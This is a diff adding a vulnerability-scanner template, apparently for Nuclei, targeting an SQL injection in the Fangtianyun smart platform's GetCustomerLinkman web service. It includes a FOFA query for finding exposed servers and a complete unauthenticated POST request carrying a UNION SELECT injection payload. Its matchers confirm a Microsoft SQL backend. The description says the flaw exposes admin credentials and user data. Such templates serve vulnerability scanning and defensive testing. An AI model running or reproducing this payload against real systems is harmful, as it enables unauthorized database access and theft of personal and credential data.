@@ -1,0 +1,38 @@
+id: fangtianyunzhihui-GetCustomerLinkman-sql
+
+info:
+  name: "方天云智慧平台GetCustomerLinkman接口SQL注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="AjaxMethods.asmx/GetCompanyItem"
+      方天云智慧平台GetCustomerLinkman接口存在SQL注入缺陷，未授权攻击者可利用该漏洞提取数据库敏感数据（如管理员后台凭证、用户个人数据），并在具备高权限条件下向服务器植入恶意代码，进而控制服务器系统权限。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140867989
+  tags: 方天云智慧平台
+
+
+
+http:
+- raw:
+  - |
+    POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {clmID:"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Microsoft SQL'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
